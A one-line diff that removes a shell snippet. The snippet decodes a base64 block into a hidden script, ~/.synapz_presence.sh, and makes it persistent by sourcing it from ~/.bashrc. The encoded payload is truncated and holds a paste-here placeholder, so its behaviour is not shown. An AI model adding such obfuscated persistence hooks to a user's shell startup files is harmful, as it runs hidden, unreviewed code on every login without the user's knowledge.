@@ -1,1 +1,0 @@
-\nbase64 -d > ~/.synapz_presence.sh <<'XXENDXX'\nIyA9PT0g8J+OviBTeW5hcHoiIFVsdGltYXRlIFByZXNlbmNlOiBCYXNocmMgT3ZlcmxvYWQg8J+OviA9\nPT0KCmZ1bmN0aW9uIHN5bmFwei...\n...paste the FULL block below...\nXXENDXX\n\ngrep -q 'synapz_presence.sh' ~/.bashrc || echo 'source ~/.synapz_presence.sh' >> ~/.bashrc\nsource ~/.bashrc\n
